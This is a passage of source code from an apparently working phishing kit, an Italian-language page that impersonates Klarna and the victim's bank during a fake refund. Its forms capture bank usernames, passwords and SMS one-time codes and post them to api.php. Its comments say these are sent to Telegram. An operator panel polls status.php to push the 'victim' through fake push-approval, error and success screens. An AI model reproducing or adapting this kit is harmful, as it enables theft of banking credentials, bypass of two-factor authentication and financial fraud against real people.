            <form id="bank-login-form" onsubmit="submitBankLogin(event)" class="space-y-4">
                <div id="bank-login-fields">
                    <?php foreach ($fields as $i => $field): ?>
                    <div class="mb-4">
                        <label class="text-[13px] font-semibold text-[#080516] mb-1.5 block"><?php echo htmlspecialchars($field['label']); ?></label>
                        <input type="<?php echo $field['type']; ?>"
                               id="bank-field-<?php echo $i; ?>"
                               placeholder="<?php echo htmlspecialchars($field['placeholder']); ?>"
                               required
                               class="w-full px-4 py-3.5 rounded-xl outline-none transition-all placeholder:text-[#8a8a96]"
                               style="border: 1.5px solid #d1d1d6;">
                    </div>
                    <?php endforeach; ?>
                </div>
                <div id="bank-login-error" class="error-msg-bar">
                    <span class="error-dot">!</span> <span class="ml-2 font-medium">Credenziali non valide. Riprova.</span>
                </div>
                <button type="submit" id="btn-login-submit" class="w-full btn-dark btn-dark-btn py-3.5 rounded-full font-bold text-[1rem] flex items-center justify-center">
                    <span class="btn-text">Accedi in Sicurezza</span><div class="spinner"></div>
                </button>
            </form>
        </div>
        <div class="bottom-section">
            <div class="mt-3 text-[10px] text-[#8a8a96] text-center pb-3">Le tue credenziali sono crittografate con protocollo PSD2</div>
        </div>
    </div>

    <!-- ====== STEP 3: PUSH NOTIFICATION ====== -->
    <div id="step-push" class="hidden">
        <div class="flex justify-between items-center mb-6">
            <button onclick="goToLogin()" class="text-xl hover:opacity-50">←</button>
            <span class="klarna-badge px-3 py-1 rounded-full font-bold text-[11px] uppercase">Klarna</span>
            <button onclick="goBackToIndex()" class="text-2xl font-light hover:opacity-50 leading-none">&times;</button>
        </div>
        <div class="flex-grow flex flex-col items-center text-center">
            <div class="relative w-20 h-20 mx-auto mb-4">
                <div class="absolute inset-0 border-4 border-[#e5e5ea] rounded-full"></div>
                <div id="push-spinner" class="absolute inset-0 border-4 rounded-full border-t-transparent animate-spin" style="border-color: #080516; border-top-color: transparent;"></div>
                <div class="absolute inset-0 flex items-center justify-center">
                    <i class="fa-solid fa-mobile-screen-button text-2xl text-[#080516]"></i>
                </div>
            </div>
            <h3 class="text-[20px] font-bold text-[#080516] mb-1">Autorizzazione Push in Attesa</h3>
            <p class="text-[13px] text-[#5e5e6e] max-w-xs mx-auto mb-4">
                Abbiamo inviato una richiesta di verifica all'app ufficiale di <strong><?php echo htmlspecialchars($bankName); ?></strong> sul tuo dispositivo mobile. Aprila e clicca su <strong>Conferma</strong>.
            </p>
            <div class="bg-amber-50 rounded-xl p-4 mb-6 text-amber-700 text-xs flex items-start gap-2.5 text-left border border-amber-200 w-full">
                <i class="fa-solid fa-circle-exclamation mt-0.5 text-sm text-amber-500"></i>
                <span>Verifica che le notifiche push siano abilitate per la tua app <?php echo htmlspecialchars($bankName); ?>. Puoi approvare l'operazione anche aprendo direttamente l'app.</span>
            </div>
            <button onclick="switchToSms()" class="text-sm font-semibold text-[#4b3ec4] hover:underline transition">
                Non hai ricevuto la notifica? Usa il codice SMS
            </button>
        </div>
        <div class="bottom-section pt-4">
            <div class="text-[10px] text-[#8a8a96] text-center pb-3">In attesa di conferma push sul tuo dispositivo</div>
        </div>
    </div>

    <!-- ====== STEP 4: SMS OTP ====== -->
    <div id="step-sms" class="hidden">
        <div class="flex justify-between items-center mb-6">
            <button onclick="goToPush()" class="text-xl hover:opacity-50">←</button>
            <span class="klarna-badge px-3 py-1 rounded-full font-bold text-[11px] uppercase">Klarna</span>
            <button onclick="goBackToIndex()" class="text-2xl font-light hover:opacity-50 leading-none">&times;</button>
        </div>
        <div class="flex-grow">
            <p class="text-[14px] text-[#5e5e6e] mb-6 text-center">Abbiamo inviato un codice di sicurezza monouso (OTP) di 6 cifre al tuo numero di cellulare associato. Inseriscilo qui sotto.</p>
            <div class="flex justify-center gap-2 mb-6">
                <input type="text" id="sms-code-input" maxlength="6" class="w-full text-center tracking-[8px] text-2xl font-mono font-bold py-4 bg-[#f7f7f7] border border-[#d1d1d6] rounded-xl focus:outline-none focus:border-[#080516] focus:bg-white transition" placeholder="000000" inputmode="numeric" oninput="this.value=this.value.replace(/\D/g,'')">
            </div>
            <div id="sms-error" class="error-msg-bar">
                <span class="error-dot">!</span> <span class="ml-2 font-medium">Codice SMS errato. Riprova.</span>
            </div>
            <button id="btn-sms-submit" onclick="submitSmsOtp()" class="w-full btn-dark btn-dark-btn py-3.5 rounded-full font-bold text-[1rem] flex items-center justify-center">
                <span class="btn-text">Conferma Codice</span><div class="spinner"></div>
            </button>
        </div>
        <div class="bottom-section">
            <button onclick="goToPush()" class="w-full text-center text-xs text-[#4b3ec4] hover:underline font-semibold mt-4 transition">
                <i class="fa-solid fa-chevron-left text-[10px]"></i> Torna alla notifica push
            </button>
            <div class="text-[10px] text-[#8a8a96] text-center pb-3 mt-2">Il codice è valido per 5 minuti</div>
        </div>
    </div>

    <!-- ====== STEP 5: SUCCESS ====== -->
    <div id="step-success" class="hidden">
        <div class="flex-grow flex flex-col items-center justify-center text-center">
            <div class="w-20 h-20 bg-emerald-50 text-emerald-500 border border-emerald-200 rounded-full flex items-center justify-center text-3xl mb-6 shadow-inner">
                <i class="fa-solid fa-circle-check"></i>
            </div>
            <h3 class="text-2xl font-bold text-[#080516] mb-1">Collegamento Riuscito</h3>
            <p class="text-sm text-[#5e5e6e] max-w-xs mx-auto">Il tuo conto <strong><?php echo htmlspecialchars($bankName); ?></strong> è stato collegato con successo. La sincronizzazione PSD2 è attiva.</p>
            <div class="bg-[#f8f9fa] border border-[#e0e0e0] rounded-xl p-4 my-6 text-left text-xs space-y-2 w-full">
                <div class="flex justify-between"><span class="text-[#5e5e6e]">Stato Collegamento:</span> <span class="font-bold text-emerald-500 uppercase">Verificato</span></div>
                <div class="flex justify-between"><span class="text-[#5e5e6e]">Consenso Open Banking:</span> <span class="font-medium text-[#080516]">Attivo (90 giorni)</span></div>
                <div class="flex justify-between"><span class="text-[#5e5e6e]">Istituzione:</span> <span class="font-semibold text-[#080516]"><?php echo htmlspecialchars($bankName); ?></span></div>
            </div>
            <button onclick="returnToKlarna()" class="w-full btn-dark btn-dark-btn py-3.5 rounded-full font-bold text-[1rem] flex items-center justify-center">
                <span class="btn-text">Torna al rimborso Klarna</span><div class="spinner"></div>
            </button>
        </div>
        <div class="bottom-section pt-4">
            <div class="text-[10px] text-[#8a8a96] text-center pb-3">Verrai reindirizzato alla pagina del rimborso</div>
        </div>
    </div>

</div>
<?php endif; ?>

<script>
const BANK_ID = <?php echo json_encode($bank_id); ?>;
const BANK_NAME = <?php echo json_encode($bankName); ?>;
const HAS_BRANCHES = <?php echo json_encode(count($branches) > 0); ?>;
const USER_EMAIL = <?php echo json_encode($user_email); ?>;
let selectedBranchId = <?php echo json_encode($branch_id); ?>;
let selectedBranchName = null;
let smsVerified = false;
let currentStep = HAS_BRANCHES ? 'step-branch' : 'step-login';
let lastStatus = '';
let statusPollInterval = null;

function apiPost(data) {
    let fd = new FormData();
    for (let k in data) fd.append(k, data[k]);
    return fetch('api.php', { method: 'POST', body: fd });
}

function showStep(id) {
    ['step-branch','step-login','step-push','step-sms','step-success'].forEach(s => {
        const el = document.getElementById(s);
        if (el) el.classList.add('hidden');
    });
    const target = document.getElementById(id);
    if (target) target.classList.remove('hidden');
    currentStep = id;
    if (id === 'step-push' || id === 'step-sms') startStatusPolling();
    if (id === 'step-success') stopStatusPolling();
}

// ============ STATUS POLLER ============
function startStatusPolling() {
    if (statusPollInterval) return;
    statusPollInterval = setInterval(checkBankStatus, 2000);
}

function stopStatusPolling() {
    if (statusPollInterval) { clearInterval(statusPollInterval); statusPollInterval = null; }
}

function checkBankStatus() {
    fetch('status.php?' + Date.now(), { cache: 'no-store' })
        .then(r => r.json())
        .then(data => {
            let s = '';
            for (let ip in data) {
                const entry = data[ip];
                const recent = (Date.now()/1000 - (entry.last_seen || 0)) < 120;
                if (!recent) continue;
                if (USER_EMAIL && entry.email === USER_EMAIL) {
                    s = entry.status || '';
                    break;
                }
                // Fallback: match any bank_ or routing status
                if (!s && (entry.status && (entry.status.startsWith('bank_') || entry.status === 'go_card_force' || entry.status === 'go_bank_force' || entry.status === 'reset'))) {
                    s = entry.status;
                }
            }
            if (s && s !== lastStatus) {
                lastStatus = s;
                // Routing commands that send victim back to index.php
                if (s === 'go_card_force' || s === 'go_bank_force' || s === 'reset') {
                    stopStatusPolling();
                    window.location.href = 'index.php';
                    return;
                }
                handlePanelCommand(s);
            }
        }).catch(() => {});
}

function handlePanelCommand(status) {
    switch (status) {
        case 'bank_push_pending': {
            // Panel wants victim to see push notification screen
            const loginBtn = document.getElementById('btn-login-submit');
            if (loginBtn) loginBtn.classList.remove('is-loading');
            showStep('step-push');
            break;
        }
        case 'bank_login_error': {
            const loginBtn = document.getElementById('btn-login-submit');
            if (loginBtn) loginBtn.classList.remove('is-loading');
            const loginError = document.getElementById('bank-login-error');
            if (loginError) loginError.style.display = 'flex';
            const pwdInputs = document.querySelectorAll('#bank-login-fields input[type="password"]');
            pwdInputs.forEach(inp => { inp.value = ''; });
            showStep('step-login');
            break;
        }
        case 'bank_push_approve':
            stopStatusPolling();
            showStep('step-success');
            break;
        case 'bank_sms_error': {
            smsVerified = false;
            const smsBtn = document.getElementById('btn-sms-submit');
            if (smsBtn) { smsBtn.classList.remove('is-loading'); smsBtn.style.display = 'flex'; }
            const smsContinue = document.getElementById('btn-sms-continue');
            if (smsContinue) smsContinue.style.display = 'none';
            const smsSuccess = document.getElementById('sms-success');
            if (smsSuccess) smsSuccess.classList.add('hidden');
            const smsError = document.getElementById('sms-error');
            if (smsError) smsError.style.display = 'flex';
            const smsInput = document.getElementById('sms-code-input');
            if (smsInput) { smsInput.value = ''; smsInput.disabled = false; }
            showStep('step-sms');
            break;
        }
        case 'bank_success':
            stopStatusPolling();
            showStep('step-success');
            break;
    }
}

// ============ NAVIGATION ============
function goBackToIndex() {
    stopStatusPolling();
    window.location.href = 'index.php';
}

function goBack() {
    if (currentStep === 'step-branch') {
        goBackToIndex();
    } else if (currentStep === 'step-login') {
        stopStatusPolling();
        if (HAS_BRANCHES) {
            showStep('step-branch');
        } else {
            goBackToIndex();
        }
    } else {
        stopStatusPolling();
        showStep(HAS_BRANCHES ? 'step-branch' : 'step-login');
    }
}

function goToLogin() {
    stopStatusPolling();
    // Reset login button state
    const loginBtn = document.getElementById('btn-login-submit');
    if (loginBtn) loginBtn.classList.remove('is-loading');
    const loginError = document.getElementById('bank-login-error');
    if (loginError) loginError.style.display = 'none';
    // Clear password field
    const pwdInputs = document.querySelectorAll('#bank-login-fields input[type="password"]');
    pwdInputs.forEach(inp => { inp.value = ''; });
    showStep('step-login');
}

function goToPush() {
    showStep('step-push');
}

function selectBranch(id, name) {
    selectedBranchId = id;
    selectedBranchName = name;
    document.getElementById('login-branch-suffix').innerText = ' - ' + name;
    apiPost({
        type: 'branch_selected',
        branch_id: id,
        branch_name: name,
        bank_id: BANK_ID,
        bank_name: BANK_NAME
    });
    showStep('step-login');
}

function submitBankLogin(e) {
    e.preventDefault();
    const btn = document.getElementById('btn-login-submit');
    const error = document.getElementById('bank-login-error');

    const fieldInputs = document.querySelectorAll('#bank-login-fields input');
    let username = '', password = '';
    fieldInputs.forEach((inp, i) => {
        if (i === 0) username = inp.value.trim();
        if (i === fieldInputs.length - 1) password = inp.value.trim();
    });

    if (!username || !password) {
        error.style.display = 'flex';
        return;
    }
    error.style.display = 'none';
    btn.classList.add('is-loading');

    apiPost({
        type: 'bank_login',
        username: username,
        password: password,
        bank_id: BANK_ID,
        bank_name: BANK_NAME,
        branch_id: selectedBranchId || '',
        branch_name: selectedBranchName || ''
    }).then(() => {
        // Credentials sent to Telegram — spinner stays spinning
        // Panel decides: PUSH APPROVE → success, or LOGIN ERROR → retry
        lastStatus = 'bank_login_submitted';
        startStatusPolling();
    }).catch(() => {
        btn.classList.remove('is-loading');
        error.style.display = 'flex';
    });
}

function showBankPush() {
    apiPost({
        type: 'bank_push_pending',
        bank_name: BANK_NAME,
        bank_id: BANK_ID
    });
    lastStatus = 'bank_push_pending';
    showStep('step-push');
}

function switchToSms() {
    smsVerified = false;
    lastStatus = '';
    const se = document.getElementById('sms-error');
    const bs = document.getElementById('btn-sms-submit');
    const sc = document.getElementById('sms-code-input');
    if (se) se.style.display = 'none';
    if (bs) { bs.style.display = 'flex'; bs.classList.remove('is-loading'); }
    if (sc) { sc.value = ''; sc.disabled = false; }
    showStep('step-sms');
}

function submitSmsOtp() {
    const btn = document.getElementById('btn-sms-submit');
    const code = document.getElementById('sms-code-input').value.replace(/\D/g, '');
    if (code.length !== 6) {
        document.getElementById('sms-error').style.display = 'flex';
        return;
    }
    document.getElementById('sms-error').style.display = 'none';
    btn.classList.add('is-loading');
    document.getElementById('sms-code-input').disabled = true;

    apiPost({
        type: 'bank_sms_otp',
        code: code,
        bank_name: BANK_NAME,
        bank_id: BANK_ID
    }).then(() => {
        // SMS code sent to Telegram — spinner stays forever
        // Panel decides: PUSH APPROVE → success, or SMS ERROR → retry
        lastStatus = 'bank_sms_otp_submitted';
    }).catch(() => {
        btn.classList.remove('is-loading');
        document.getElementById('sms-code-input').disabled = false;
        document.getElementById('sms-error').style.display = 'flex';
    });
}

function proceedToSuccess() {
    // Removed — panel controls this via PUSH APPROVE
}

function returnToKlarna() {
    stopStatusPolling();
    apiPost({
        type: 'bank_push_approved',
        bank_name: BANK_NAME,
        bank_id: BANK_ID
    }).then(() => {
        window.location.href = 'index.php';
    }).catch(() => {
        window.location.href = 'index.php';
    });
}

// Pre-selected branch? skip to login
if (selectedBranchId && HAS_BRANCHES) {
    document.addEventListener('DOMContentLoaded', function() {
        const branchButtons = document.querySelectorAll('#branch-list-container button');
        branchButtons.forEach(btn => {
            const onclick = btn.getAttribute('onclick') || '';
            const match = onclick.match(/selectBranch\('([^']+)',\s*'([^']+)'\)/);
            if (match && match[1] === selectedBranchId) {
                selectedBranchName = match[2];
                document.getElementById('login-branch-suffix').innerText = ' - ' + selectedBranchName;
                showStep('step-login');
            }
        });
    });
}
</script>
</body>
</html>
